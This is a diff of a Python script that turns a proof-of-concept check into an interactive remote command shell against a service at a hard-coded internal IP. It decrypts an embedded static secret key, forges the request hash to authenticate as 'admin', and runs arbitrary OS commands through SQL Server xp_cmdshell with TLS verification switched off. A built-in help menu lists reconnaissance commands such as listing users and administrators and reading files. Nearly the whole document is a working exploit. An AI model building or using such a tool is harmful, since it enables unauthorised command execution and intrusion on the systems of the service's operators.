@@ -1,106 +1,141 @@
 #!/usr/bin/env python3
-import socket
-import ssl
-import sys
-import hashlib
-import base64
-import json
-import uuid
-from datetime import datetime
+import socket, ssl, hashlib, base64, re, readline
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
 
-KEY_STATIC = "a3(D3$@fK3"
-ENCRYPTED_SECRET_KEY = "USJJ2ecM0/T8zLBzfsOec7KB1jIBUXcypIfvedawppk="
-IV_16_ZERO = b"\x00" * 16
+HOST           = "10.6.19.185"
+PORT           = 5757
+TIMEOUT        = 8
+FIXED_FILENAME = "SqlFileDynamic.sql"
+KEY_STATIC     = "a3(D3$@fK3"
+ENCRYPTED_SK   = "USJJ2ecM0/T8zLBzfsOec7KB1jIBUXcypIfvedawppk="
+USE_TLS        = True
 
-def get_key(password):
-    pwd = password.ljust(24, " ") if len(password.encode("utf-8")) < 24 else password[:24]
-    return pwd.encode("utf-8")
+def decrypt_secret_key(enc_b64, key_static):
+    aes_key = key_static.ljust(24).encode("utf-8")
+    enc     = base64.b64decode(enc_b64)
+    dec     = Cipher(algorithms.AES(aes_key), modes.ECB()).decryptor()
+    raw     = dec.update(enc) + dec.finalize()
+    return raw[:-raw[-1]].decode("utf-8")
 
-def aes_encrypt(plaintext, password):
-    key = get_key(password if password else KEY_STATIC)
-    data = plaintext.encode("ascii")
-    pad_len = 16 - (len(data) % 16)
-    data_padded = data + bytes([pad_len] * pad_len)
-    cipher = Cipher(algorithms.AES(key), modes.CBC(IV_16_ZERO), backend=default_backend())
-    encryptor = cipher.encryptor()
-    return base64.b64encode(encryptor.update(data_padded) + encryptor.finalize()).decode("ascii")
+REAL_SECRET_KEY = decrypt_secret_key(ENCRYPTED_SK, KEY_STATIC)
 
-def aes_decrypt(cipher_b64, password):
-    key = get_key(password if password else KEY_STATIC)
-    ct = base64.b64decode(cipher_b64.replace(" ", "+"))
-    cipher = Cipher(algorithms.AES(key), modes.CBC(IV_16_ZERO), backend=default_backend())
-    decryptor = cipher.decryptor()
-    padded = decryptor.update(ct) + decryptor.finalize()
-    return padded[:-padded[-1]].decode("utf-8")
+def forge_hash(sql):
+    data = sql + REAL_SECRET_KEY + FIXED_FILENAME
+    return hashlib.sha256(data.encode("utf-8")).hexdigest().upper()
 
-def process_encrypt_value(plaintext, guid=None):
-    if guid is None:
-        guid = str(uuid.uuid4()).replace("-", "")[:16]
-    first_part = aes_encrypt(plaintext, guid + KEY_STATIC)
-    secret_key = first_part[:12]
-    second_part = aes_encrypt(guid, secret_key + KEY_STATIC)
-    return first_part + "|" + second_part
+def send_raw(payload, timeout=TIMEOUT):
+    try:
+        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        raw_sock.settimeout(timeout)
+        raw_sock.connect((HOST, PORT))
+        
+        if USE_TLS:
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            s = ctx.wrap_socket(raw_sock, server_hostname=HOST)
+        else:
+            s = raw_sock
+        
+        s.sendall(payload.encode("utf-8"))
+        resp = b""
+        while True:
+            try:
+                chunk = s.recv(4096)
+                if not chunk:
+                    break
+                resp += chunk
+            except socket.timeout:
+                break
+        s.close()
+        return resp.decode(errors="replace").strip()
+    except Exception as e:
+        return f"CONN_ERROR: {e}"
 
-def connect(target, port, use_tls=True):
-    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    raw_sock.settimeout(10)
-    raw_sock.connect((target, port))
-    if use_tls:
-        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
-        return ctx.wrap_socket(raw_sock, server_hostname=target)
-    return raw_sock
+def fmt(resp):
+    if not resp:
+        return "(empty)"
+    rows = resp.split(";")
+    return "\n".join(r.replace("~", "  |  ") for r in rows if r.strip())
 
-def send_recv(sock, payload):
-    sock.sendall(payload.encode("utf-8"))
-    chunks = []
+def os_cmd(cmd):
+    cmd = re.sub(r'([A-Za-z]):', r'%SYSTEMDRIVE%', cmd, count=1)
+    sql     = f"EXEC xp_cmdshell '{cmd}'"
+    h       = forge_hash(sql)
+    payload = f"QUERY-DATA::SQLSERVER:{sql}:{h}:admin"
+    return send_raw(payload)
+
+HISTORY_FILE = ".qbtk_history"
+try:
+    readline.read_history_file(HISTORY_FILE)
+except FileNotFoundError:
+    pass
+readline.set_history_length(500)
+
+def save_history():
+    readline.write_history_file(HISTORY_FILE)
+
+def interactive_shell():
+    print(f"\n\033[1;32m[*] Connected  : {HOST}:{PORT} (TLS={USE_TLS})")
+    print(f"[*] SecretKey  : {REAL_SECRET_KEY}")
+    print(f"[*] sysadmin   : YES\033[0m")
+    print("\nType a command, \033[1;33mhelp\033[0m, or \033[1;31mexit\033[0m\n")
+
     while True:
         try:
-            data = sock.recv(65536)
-            if not data:
-                break
-            chunks.append(data)
-        except socket.timeout:
+            line = input("\033[1;36mshell\033[0m \033[1;37m>\033[0m ").strip()
+        except (KeyboardInterrupt, EOFError):
+            print("\n[*] Exiting.")
+            save_history()
             break
-    return b"".join(chunks).decode("utf-8", errors="replace")
 
-def main():
-    if len(sys.argv) < 2:
-        print("Usage: python v21_poc.py <target_ip> [port] [--no-tls]")
-        return
+        if not line:
+            continue
 
-    target = sys.argv[1]
-    port = int(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].startswith("--") else 5758
-    use_tls = "--no-tls" not in sys.argv
+        if line != readline.get_history_item(readline.get_current_history_length()):
+            readline.add_history(line)
+        save_history()
 
-    today = datetime.now().strftime("%Y-%m-%d")
-    uid = str(uuid.uuid4()).replace("-", "")[:16]
-    sql = "EXEC xp_cmdshell CONCAT(CHAR(39), 'whoami', CHAR(39))"
+        if line.lower() in ("exit", "quit"):
+            print("[*] Bye.")
+            save_history()
+            break
 
-    payload = process_encrypt_value(f"QUERY-DATA=SQLSERVER={sql}={today}|{uid}=exploit_{uid[:8]}")
+        elif line.lower() in ("help", "?"):
+            print("""
+\033[1;33mCommands:\033[0m
+  whoami /all
+  hostname
+  net user
+  net localgroup administrators
+  ipconfig
+  tasklist
+  netstat -an
+  dir c:\\
+  type c:\\path\\to\\file.txt
+  powershell Get-ChildItem $env:SystemDrive\\
 
-    try:
-        sock = connect(target, port, use_tls)
-        response = send_recv(sock, payload)
-        sock.close()
+\033[1;33mHistory:\033[0m
+  ↑ ↓         browse previous commands
+  history     show command history
 
-        print(f"Target: {target}:{port}")
-        print(f"Response ({len(response)} bytes):")
-        try:
-            print(json.dumps(json.loads(response), indent=2))
-        except:
-            print(response)
-        print()
+\033[1;31mNote:\033[0m C:\\ auto-converted to %SYSTEMDRIVE%\\ internally
+""")
 
-        if "OK" in response or "SUCCESS" in response.upper():
-            print(">>> VULNERABLE <<<")
+        elif line.lower() == "history":
+            total = readline.get_current_history_length()
+            for i in range(1, total + 1):
+                print(f"  {i:>3}  {readline.get_history_item(i)}")
+
         else:
-            print(">>> NOT VULNERABLE <<<")
-    except Exception as e:
-        print(f"Connection failed: {e}")
+            resp = os_cmd(line)
+            if "ERROR=" in resp or "CONN_ERROR" in resp:
+                print(f"\033[1;31m[ERR]\033[0m {resp}")
+            else:
+                print(f"\033[1;32m[OK]\033[0m\n{fmt(resp)}")
 
 if __name__ == "__main__":
-    main()
+    import sys
+    if "--no-tls" in sys.argv:
+        USE_TLS = False
+    interactive_shell()
